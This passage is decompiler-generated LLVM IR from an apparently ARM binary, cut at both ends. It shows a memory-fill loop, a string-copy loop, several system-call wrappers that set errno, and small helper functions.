  store i32 %v3_1117c, i32* %r2.global-to-local, align 4
  %v4_11180 = call i32 @function_13cb4(i32 %v2_11174, i32 %v3_11178, i32 %v3_1117c, i32 %v6_11168)
  %tmp9 = icmp slt i32 %v4_11180, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_11190

.thread:                                          ; preds = %dec_label_pc_11174
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_111c4

dec_label_pc_11190:                               ; preds = %dec_label_pc_11174
  %v1_11190 = load i32, i32* @r5, align 4
  %v2_11190 = add i32 %v1_11190, 8
  %v3_11190 = inttoptr i32 %v2_11190 to i32*
  store i32 %v4_11180, i32* %v3_11190, align 4
  %v0_11194 = load i32, i32* @r7, align 4
  %v1_11194 = load i32, i32* @r5, align 4
  %v2_11194 = add i32 %v1_11194, 4
  %v3_11194 = inttoptr i32 %v2_11194 to i32*
  store i32 %v0_11194, i32* %v3_11194, align 4
  %v0_11198.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11198

dec_label_pc_11198:                               ; preds = %dec_label_pc_11168, %dec_label_pc_11190
  %v1_111a8 = phi i32 [ %v0_11168, %dec_label_pc_11168 ], [ %v0_11198.pre, %dec_label_pc_11190 ]
  %v1_11198 = add i32 %v1_111a8, 4
  %v2_11198 = inttoptr i32 %v1_11198 to i32*
  %v3_11198 = load i32, i32* %v2_11198, align 4
  store i32 %v3_11198, i32* %r2.global-to-local, align 4
  %v1_1119c = add i32 %v1_111a8, 12
  %v2_1119c = inttoptr i32 %v1_1119c to i32*
  %v3_1119c = load i32, i32* %v2_1119c, align 4
  store i32 %v3_1119c, i32* %r1.global-to-local, align 4
  %v2_111a0 = add i32 %v3_1119c, %v3_11198
  store i32 %v2_111a0, i32* @r4, align 4
  %v1_111a4 = add i32 %v2_111a0, 4
  %v2_111a4 = inttoptr i32 %v1_111a4 to i32*
  %v3_111a4 = load i32, i32* %v2_111a4, align 4
  %v2_111a8 = add i32 %v1_111a8, 16
  %v3_111a8 = inttoptr i32 %v2_111a8 to i32*
  store i32 %v3_111a4, i32* %v3_111a8, align 4
  %v0_111ac = load i32, i32* @r4, align 4
  %v1_111ac = add i32 %v0_111ac, 8
  %v2_111ac = inttoptr i32 %v1_111ac to i16*
  %v3_111ac = load i16, i16* %v2_111ac, align 2
  %v4_111ac = zext i16 %v3_111ac to i32
  %v0_111b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_111b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_111b0 = add i32 %v1_111b0, %v0_111b0
  %v3_111b0 = inttoptr i32 %v2_111b0 to i32*
  %v4_111b0 = load i32, i32* %v3_111b0, align 4
  store i32 %v4_111b0, i32* %r1.global-to-local, align 4
  %v2_111b4 = add i32 %v0_111b0, %v4_111ac
  %v2_111b8 = icmp eq i32 %v4_111b0, 0
  %v1_111bc = load i32, i32* @r5, align 4
  %v2_111bc = add i32 %v1_111bc, 4
  %v3_111bc = inttoptr i32 %v2_111bc to i32*
  store i32 %v2_111b4, i32* %v3_111bc, align 4
  br i1 %v2_111b8, label %dec_label_pc_11168, label %dec_label_pc_111c4

dec_label_pc_111c4:                               ; preds = %dec_label_pc_11198, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_111d0 = load i32, i32* @r6, align 4
  %v2_111d0 = add i32 %v0_111d0, 24
  %v3_111d0 = inttoptr i32 %v2_111d0 to i32*
  %v4_111d0 = load i32, i32* %v3_111d0, align 4
  store i32 %v4_111d0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_111d0)
  %v0_111dc = load i32, i32* @r4, align 4
  store i32 %v3_11118, i32* @r4, align 4
  store i32 %v6_11118, i32* @r5, align 4
  store i32 %v9_11118, i32* @r6, align 4
  store i32 %v12_11118, i32* @r7, align 4
  store i32 %v15_11118, i32* @lr, align 4
  ret i32 %v0_111dc

; uselistorder directives
  uselistorder i32 %v1_111a8, { 0, 2, 1 }
  uselistorder i32 %v6_11168, { 1, 0 }
  uselistorder i32 %v0_11168, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_11198, { 1, 0 }
}

define i32 @function_111f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_111f0:
  %v0_111f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_111f0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_111f0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_111f0, %bb
  %v10_111fc = phi i32 [ %arg1, %dec_label_pc_111f0 ], [ 0, %bb ]
  ret i32 %v10_111fc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_11200() local_unnamed_addr {
dec_label_pc_11200:
  store i32 124804, i32* @r3, align 4
  ret i32 ptrtoint (i32* @global_var_1ea38.353 to i32)
}

define i32 @function_1121c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1121c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_11220 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11220, i32* @r0, align 4
  %v1_11228 = call i32 @function_14124(i32 %v2_11220)
  %v2_1122c = load i32, i32* %stack_var_-24, align 4
  %v2_11230 = add i32 %v2_1122c, %tmp
  %v2_11238 = mul i32 %v2_11230, 10000
  %v1_1123c = and i32 %v2_11238, 2147483632
  ret i32 %v1_1123c

; uselistorder directives
  uselistorder i32 %v2_11220, { 1, 0 }
}

define i32 @function_11250(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11250:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_11254 = load i32, i32* @r2, align 4
  %v8_11254 = icmp eq i32 %v0_11254, 8
  store i1 %v8_11254, i1* %cpsr_z.global-to-local, align 1
  %v5_11258 = icmp slt i32 %v0_11254, 8
  br i1 %v5_11258, label %dec_label_pc_112b8, label %dec_label_pc_1125c

dec_label_pc_1125c:                               ; preds = %dec_label_pc_11250
  %v4_1125c = mul i32 %arg2, 256
  %v5_1125c = or i32 %v4_1125c, %arg2
  %v4_11260 = mul i32 %v5_1125c, 65536
  %v5_11260 = or i32 %v4_11260, %v5_1125c
  store i32 %v5_11260, i32* %r1.global-to-local, align 4
  %v1_1126457 = urem i32 %tmp, 4
  %v2_1126458 = icmp eq i32 %v1_1126457, 0
  store i1 %v2_1126458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1126458, label %dec_label_pc_11274, label %bb

bb:                                               ; preds = %dec_label_pc_1125c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1125c ]
  %v3_1126859 = phi i32 [ %v6_11268, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1125c ]
  %v4_11268 = inttoptr i32 %v3_1126859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11268, align 1
  %v5_11268 = load i32, i32* @r3, align 4
  %v6_11268 = add i32 %v5_11268, 1
  store i32 %v6_11268, i32* @r3, align 4
  %v0_1126c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11278.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1126c.pr, label %dec_label_pc_11274, label %.thread

.thread:                                          ; preds = %bb
  %v2_1126c = add i32 %v0_11278.pr.pre, -1
  store i32 %v2_1126c, i32* @r2, align 4
  %v1_11264 = urem i32 %v6_11268, 4
  %v2_11264 = icmp eq i32 %v1_11264, 0
  store i1 %v2_11264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11264, label %dec_label_pc_11274, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11268.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_11268.pre to i8
  br label %bb

dec_label_pc_11274:                               ; preds = %.thread, %bb, %dec_label_pc_1125c
  %v0_1128028 = phi i32 [ %tmp, %dec_label_pc_1125c ], [ %v6_11268, %bb ], [ %v6_11268, %.thread ]
  %v0_11278.pr = phi i32 [ %v0_11254, %dec_label_pc_1125c ], [ %v0_11278.pr.pre, %bb ], [ %v2_1126c, %.thread ]
  %v0_11274 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11274, i32* @ip, align 4
  %v8_1127810 = icmp eq i32 %v0_11278.pr, 8
  store i1 %v8_1127810, i1* %cpsr_z.global-to-local, align 1
  %v5_1127c11 = icmp slt i32 %v0_11278.pr, 8
  br i1 %v5_1127c11, label %dec_label_pc_112b8, label %dec_label_pc_11280.preheader

dec_label_pc_11280.preheader:                     ; preds = %dec_label_pc_11274
  %v1_1128046 = inttoptr i32 %v0_1128028 to i32*
  store i32 %v0_11274, i32* %v1_1128046, align 4
  %v3_1128047 = add i32 %v0_1128028, 4
  %v4_1128048 = inttoptr i32 %v3_1128047 to i32*
  %v5_1128049 = load i32, i32* @ip, align 4
  store i32 %v5_1128049, i32* %v4_1128048, align 4
  %v6_1128050 = add i32 %v0_1128028, 8
  store i32 %v6_1128050, i32* @r3, align 4
  %v0_1128451 = load i32, i32* @r2, align 4
  %v1_1128452 = add i32 %v0_1128451, -8
  store i32 %v1_1128452, i32* %r2.global-to-local, align 4
  %v5_1128c53 = icmp slt i32 %v1_1128452, 8
  br i1 %v5_1128c53, label %dec_label_pc_11280.dec_label_pc_112b8.loopexit_crit_edge, label %dec_label_pc_11290

dec_label_pc_11290:                               ; preds = %dec_label_pc_11280.preheader, %dec_label_pc_11278.dec_label_pc_11280_crit_edge
  %v6_1128055 = phi i32 [ %v6_11280, %dec_label_pc_11278.dec_label_pc_11280_crit_edge ], [ %v6_1128050, %dec_label_pc_11280.preheader ]
  %v0_1128054 = phi i32 [ %v12_112ac, %dec_label_pc_11278.dec_label_pc_11280_crit_edge ], [ %v0_1128028, %dec_label_pc_11280.preheader ]
  %v1_11290 = inttoptr i32 %v6_1128055 to i32*
  %v2_11290 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_11290, i32* %v1_11290, align 4
  %v3_11290 = add i32 %v0_1128054, 12
  %v4_11290 = inttoptr i32 %v3_11290 to i32*
  %v5_11290 = load i32, i32* @ip, align 4
  store i32 %v5_11290, i32* %v4_11290, align 4
  %v6_11290 = add i32 %v0_1128054, 16
  store i32 %v6_11290, i32* @r3, align 4
  %v0_11294 = load i32, i32* %r2.global-to-local, align 4
  %v1_11294 = add i32 %v0_11294, -8
  store i32 %v1_11294, i32* %r2.global-to-local, align 4
  %v5_1129c = icmp slt i32 %v1_11294, 8
  br i1 %v5_1129c, label %dec_label_pc_11290.dec_label_pc_112b8.loopexit_crit_edge, label %dec_label_pc_112a0

dec_label_pc_112a0:                               ; preds = %dec_label_pc_11290
  %v1_112a0 = inttoptr i32 %v6_11290 to i32*
  %v2_112a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_112a0, i32* %v1_112a0, align 4
  %v3_112a0 = add i32 %v0_1128054, 20
  %v4_112a0 = inttoptr i32 %v3_112a0 to i32*
  %v5_112a0 = load i32, i32* @ip, align 4
  store i32 %v5_112a0, i32* %v4_112a0, align 4
  %v6_112a0 = add i32 %v0_1128054, 24
  store i32 %v6_112a0, i32* @r3, align 4
  %v0_112a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_112a4 = add i32 %v0_112a4, -8
  store i32 %v1_112a4, i32* %r2.global-to-local, align 4
  %v5_112ac = icmp slt i32 %v1_112a4, 8
  br i1 %v5_112ac, label %dec_label_pc_112a0.dec_label_pc_112b8.loopexit_crit_edge, label %dec_label_pc_11278

dec_label_pc_11278:                               ; preds = %dec_label_pc_112a0
  %v7_112ac = inttoptr i32 %v6_112a0 to i32*
  %v8_112ac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_112ac, i32* %v7_112ac, align 4
  %v9_112ac = add i32 %v0_1128054, 28
  %v10_112ac = inttoptr i32 %v9_112ac to i32*
  %v11_112ac = load i32, i32* @ip, align 4
  store i32 %v11_112ac, i32* %v10_112ac, align 4
  %v12_112ac = add i32 %v0_1128054, 32
  store i32 %v12_112ac, i32* @r3, align 4
  %v6_112b0 = load i32, i32* %r2.global-to-local, align 4
  %v7_112b0 = add i32 %v6_112b0, -8
  store i32 %v7_112b0, i32* %r2.global-to-local, align 4
  %v5_1127c = icmp slt i32 %v7_112b0, 8
  br i1 %v5_1127c, label %dec_label_pc_11278.dec_label_pc_112b8.loopexit_crit_edge, label %dec_label_pc_11278.dec_label_pc_11280_crit_edge

dec_label_pc_11278.dec_label_pc_11280_crit_edge:  ; preds = %dec_label_pc_11278
  %v2_11280.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11280 = inttoptr i32 %v12_112ac to i32*
  store i32 %v2_11280.pre, i32* %v1_11280, align 4
  %v3_11280 = add i32 %v0_1128054, 36
  %v4_11280 = inttoptr i32 %v3_11280 to i32*
  %v5_11280 = load i32, i32* @ip, align 4
  store i32 %v5_11280, i32* %v4_11280, align 4
  %v6_11280 = add i32 %v0_1128054, 40
  store i32 %v6_11280, i32* @r3, align 4
  %v0_11284 = load i32, i32* %r2.global-to-local, align 4
  %v1_11284 = add i32 %v0_11284, -8
  store i32 %v1_11284, i32* %r2.global-to-local, align 4
  %v5_1128c = icmp slt i32 %v1_11284, 8
  br i1 %v5_1128c, label %dec_label_pc_11280.dec_label_pc_112b8.loopexit_crit_edge, label %dec_label_pc_11290

dec_label_pc_11278.dec_label_pc_112b8.loopexit_crit_edge: ; preds = %dec_label_pc_11278
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_112b8

dec_label_pc_11280.dec_label_pc_112b8.loopexit_crit_edge: ; preds = %dec_label_pc_11278.dec_label_pc_11280_crit_edge, %dec_label_pc_11280.preheader
  %v1_11284.lcssa = phi i32 [ %v1_1128452, %dec_label_pc_11280.preheader ], [ %v1_11284, %dec_label_pc_11278.dec_label_pc_11280_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_112b8

dec_label_pc_11290.dec_label_pc_112b8.loopexit_crit_edge: ; preds = %dec_label_pc_11290
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_112b8

dec_label_pc_112a0.dec_label_pc_112b8.loopexit_crit_edge: ; preds = %dec_label_pc_112a0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_112b8

dec_label_pc_112b8:                               ; preds = %dec_label_pc_11274, %dec_label_pc_11278.dec_label_pc_112b8.loopexit_crit_edge, %dec_label_pc_11280.dec_label_pc_112b8.loopexit_crit_edge, %dec_label_pc_11290.dec_label_pc_112b8.loopexit_crit_edge, %dec_label_pc_112a0.dec_label_pc_112b8.loopexit_crit_edge, %dec_label_pc_11250
  %v0_112c0 = phi i32 [ %v0_11254, %dec_label_pc_11250 ], [ %v1_112a4, %dec_label_pc_112a0.dec_label_pc_112b8.loopexit_crit_edge ], [ %v1_11294, %dec_label_pc_11290.dec_label_pc_112b8.loopexit_crit_edge ], [ %v1_11284.lcssa, %dec_label_pc_11280.dec_label_pc_112b8.loopexit_crit_edge ], [ %v7_112b0, %dec_label_pc_11278.dec_label_pc_112b8.loopexit_crit_edge ], [ %v0_11278.pr, %dec_label_pc_11274 ]
  %v2_112b8 = icmp eq i32 %v0_112c0, 0
  store i1 %v2_112b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_112b8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_112b8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_112b8
  %v1_112c0 = sub i32 7, %v0_112c0
  store i32 %v1_112c0, i32* %r2.global-to-local, align 4
  %v3_112c4 = mul i32 %v1_112c0, 4
  %v4_112c4 = add i32 %v3_112c4, ptrtoint (i32* @global_var_112cc.355 to i32)
  call void @__pseudo_branch(i32 %v4_112c4)
  %v0_112cc = load i32, i32* %r1.global-to-local, align 4
  %v1_112cc = trunc i32 %v0_112cc to i8
  %v2_112cc = load i32, i32* @r3, align 4
  %v3_112cc = inttoptr i32 %v2_112cc to i8*
  store i8 %v1_112cc, i8* %v3_112cc, align 1
  %v4_112cc = load i32, i32* @r3, align 4
  %v5_112cc = add i32 %v4_112cc, 1
  store i32 %v5_112cc, i32* %r3.global-to-local, align 4
  %v0_112d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_112d0 = trunc i32 %v0_112d0 to i8
  %v3_112d0 = inttoptr i32 %v5_112cc to i8*
  store i8 %v1_112d0, i8* %v3_112d0, align 1
  %v4_112d0 = load i32, i32* %r3.global-to-local, align 4
  %v5_112d0 = add i32 %v4_112d0, 1
  store i32 %v5_112d0, i32* %r3.global-to-local, align 4
  %v0_112d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_112d4 = trunc i32 %v0_112d4 to i8
  %v3_112d4 = inttoptr i32 %v5_112d0 to i8*
  store i8 %v1_112d4, i8* %v3_112d4, align 1
  %v4_112d4 = load i32, i32* %r3.global-to-local, align 4
  %v5_112d4 = add i32 %v4_112d4, 1
  store i32 %v5_112d4, i32* %r3.global-to-local, align 4
  %v0_112d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_112d8 = trunc i32 %v0_112d8 to i8
  %v3_112d8 = inttoptr i32 %v5_112d4 to i8*
  store i8 %v1_112d8, i8* %v3_112d8, align 1
  %v4_112d8 = load i32, i32* %r3.global-to-local, align 4
  %v5_112d8 = add i32 %v4_112d8, 1
  store i32 %v5_112d8, i32* %r3.global-to-local, align 4
  %v0_112dc = load i32, i32* %r1.global-to-local, align 4
  %v1_112dc = trunc i32 %v0_112dc to i8
  %v3_112dc = inttoptr i32 %v5_112d8 to i8*
  store i8 %v1_112dc, i8* %v3_112dc, align 1
  %v4_112dc = load i32, i32* %r3.global-to-local, align 4
  %v5_112dc = add i32 %v4_112dc, 1
  store i32 %v5_112dc, i32* %r3.global-to-local, align 4
  %v0_112e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_112e0 = trunc i32 %v0_112e0 to i8
  %v3_112e0 = inttoptr i32 %v5_112dc to i8*
  store i8 %v1_112e0, i8* %v3_112e0, align 1
  %v4_112e0 = load i32, i32* %r3.global-to-local, align 4
  %v5_112e0 = add i32 %v4_112e0, 1
  store i32 %v5_112e0, i32* %r3.global-to-local, align 4
  %v0_112e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_112e4 = trunc i32 %v0_112e4 to i8
  %v3_112e4 = inttoptr i32 %v5_112e0 to i8*
  store i8 %v1_112e4, i8* %v3_112e4, align 1
  %v4_112e4 = load i32, i32* %r3.global-to-local, align 4
  %v5_112e4 = add i32 %v4_112e4, 1
  store i32 %v5_112e4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11280, { 1, 0 }
  uselistorder i32 %v12_112ac, { 1, 2, 0 }
  uselistorder i32 %v0_1128054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11278.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11268, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1125c, { 1, 0 }
  uselistorder i32 %v0_11254, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 10, 11, 12, 13, 9, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 1, 4, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_112b8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_11290, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_112f0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_112f0:
  %v0_112f0 = call i32 @function_153a0()
  ret i32 %v0_112f0
}

define i32 @function_11300() local_unnamed_addr {
dec_label_pc_11300:
  %v0_11300 = call i32 @function_153a0()
  ret i32 %v0_11300
}

define i32 @function_11310(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11310:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_113201 = load i32, i32* @r1, align 4
  %v1_113202 = inttoptr i32 %v0_113201 to i8*
  %v2_113203 = load i8, i8* %v1_113202, align 1
  %v2_113245 = icmp eq i8 %v2_113203, 0
  store i1 %v2_113245, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_113203, i8* %arg1, align 1
  br i1 %v2_113245, label %dec_label_pc_11330, label %dec_label_pc_11318

dec_label_pc_11318:                               ; preds = %dec_label_pc_11310, %dec_label_pc_11318
  %v0_11318 = load i32, i32* @r1, align 4
  %v1_11318 = add i32 %v0_11318, 1
  store i32 %v1_11318, i32* @r1, align 4
  %v0_1131c = load i32, i32* %r2.global-to-local, align 4
  %v1_1131c = add i32 %v0_1131c, 1
  store i32 %v1_1131c, i32* %r2.global-to-local, align 4
  %v1_11320 = inttoptr i32 %v1_11318 to i8*
  %v2_11320 = load i8, i8* %v1_11320, align 1
  %v2_11324 = icmp eq i8 %v2_11320, 0
  store i1 %v2_11324, i1* %cpsr_z.global-to-local, align 1
  %v3_11328 = inttoptr i32 %v1_1131c to i8*
  store i8 %v2_11320, i8* %v3_11328, align 1
  %v0_1132c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1132c, label %dec_label_pc_11330, label %dec_label_pc_11318

dec_label_pc_11330:                               ; preds = %dec_label_pc_11318, %dec_label_pc_11310
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_11318, { 1, 0 }
}

define i32 @function_11334(i32 %arg1) local_unnamed_addr {
dec_label_pc_11334:
  %stack_var_-12 = alloca i32, align 4
  %v2_1133c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1133c, i32* @r1, align 4
  %v0_11340 = call i32 @function_15c0c()
  %v2_11344 = icmp eq i32 %v0_11340, 0
  %v4_11348 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_11344, i32 -1, i32 %v4_11348
  ret i32 %storemerge
}

define i32 @function_1135c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1135c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1135c = load i32, i32* @r7, align 4
  store i32 %v3_1135c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11384, label %dec_label_pc_11374

dec_label_pc_11374:                               ; preds = %dec_label_pc_1135c
  %v0_11374 = call i32 @function_11200()
  %v0_11378 = load i32, i32* %r7.global-to-local, align 4
  %v1_11378 = sub i32 0, %v0_11378
  %v2_1137c = inttoptr i32 %v0_11374 to i32*
  store i32 %v1_11378, i32* %v2_1137c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_11388.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11384

dec_label_pc_11384:                               ; preds = %dec_label_pc_1135c, %dec_label_pc_11374
  %v2_11388 = phi i32 [ %v3_1135c, %dec_label_pc_1135c ], [ %v2_11388.pre, %dec_label_pc_11374 ]
  %v0_11384 = phi i32 [ %arg1, %dec_label_pc_1135c ], [ -1, %dec_label_pc_11374 ]
  store i32 %v2_11388, i32* @r7, align 4
  ret i32 %v0_11384

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11384, { 1, 0 }
}

define i32 @function_11394(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11394:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11394 = load i32, i32* @r7, align 4
  store i32 %v3_11394, i32* %stack_var_-8, align 4
  %v0_113a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_113a0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_113a0, -4095
  br i1 %tmp, label %dec_label_pc_113c0, label %dec_label_pc_113b0

dec_label_pc_113b0:                               ; preds = %dec_label_pc_11394
  %v0_113b0 = call i32 @function_11200()
  %v0_113b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_113b4 = sub i32 0, %v0_113b4
  %v2_113b8 = inttoptr i32 %v0_113b0 to i32*
  store i32 %v1_113b4, i32* %v2_113b8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_113c0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_113c0

dec_label_pc_113c0:                               ; preds = %dec_label_pc_11394, %dec_label_pc_113b0
  %v1_113c4 = phi i32 [ %v0_113a0, %dec_label_pc_11394 ], [ -1, %dec_label_pc_113b0 ]
  %v2_113c0 = phi i32 [ %v3_11394, %dec_label_pc_11394 ], [ %v2_113c0.pre, %dec_label_pc_113b0 ]
  store i32 %v2_113c0, i32* @r7, align 4
  ret i32 %v1_113c4

; uselistorder directives
  uselistorder i32 %v0_113a0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_113c0, { 1, 0 }
}

define i32 @function_113cc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_113cc:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_113cc = load i32, i32* @r7, align 4
  store i32 %v3_113cc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_113f4, label %dec_label_pc_113e4

dec_label_pc_113e4:                               ; preds = %dec_label_pc_113cc
  %v0_113e4 = call i32 @function_11200()
  %v0_113e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_113e8 = sub i32 0, %v0_113e8
  store i32 %v1_113e8, i32* @r3, align 4
  %v2_113ec = inttoptr i32 %v0_113e4 to i32*
  store i32 %v1_113e8, i32* %v2_113ec, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_113f8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_113f4

dec_label_pc_113f4:                               ; preds = %dec_label_pc_113cc, %dec_label_pc_113e4
  %v2_113f8 = phi i32 [ %v3_113cc, %dec_label_pc_113cc ], [ %v2_113f8.pre, %dec_label_pc_113e4 ]
  %v0_113f4 = phi i32 [ %arg1, %dec_label_pc_113cc ], [ -1, %dec_label_pc_113e4 ]
  store i32 %v2_113f8, i32* @r7, align 4
  ret i32 %v0_113f4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_113f4, { 1, 0 }
}

define i32 @function_11404(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11404:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11404 = load i32, i32* @r7, align 4
  store i32 %v3_11404, i32* %stack_var_-8, align 4
  %v0_11410 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11410, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11410, -4095
  br i1 %tmp, label %dec_label_pc_11430, label %dec_label_pc_11420

dec_label_pc_11420:                               ; preds = %dec_label_pc_11404
  %v0_11420 = call i32 @function_11200()
  %v0_11424 = load i32, i32* %r7.global-to-local, align 4
  %v1_11424 = sub i32 0, %v0_11424
  %v2_11428 = inttoptr i32 %v0_11420 to i32*
  store i32 %v1_11424, i32* %v2_11428, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11430.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11430

dec_label_pc_11430:                               ; preds = %dec_label_pc_11404, %dec_label_pc_11420
  %v1_11434 = phi i32 [ %v0_11410, %dec_label_pc_11404 ], [ -1, %dec_label_pc_11420 ]
  %v2_11430 = phi i32 [ %v3_11404, %dec_label_pc_11404 ], [ %v2_11430.pre, %dec_label_pc_11420 ]
  store i32 %v2_11430, i32* @r7, align 4
  ret i32 %v1_11434

; uselistorder directives
  uselistorder i32 %v0_11410, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11430, { 1, 0 }
}

define i32 @function_1143c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1143c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11470, label %dec_label_pc_11460

dec_label_pc_11460:                               ; preds = %dec_label_pc_1143c
  %v0_11460 = call i32 @function_11200()
  %v0_11464 = load i32, i32* %r4.global-to-local, align 4
  %v1_11464 = sub i32 0, %v0_11464
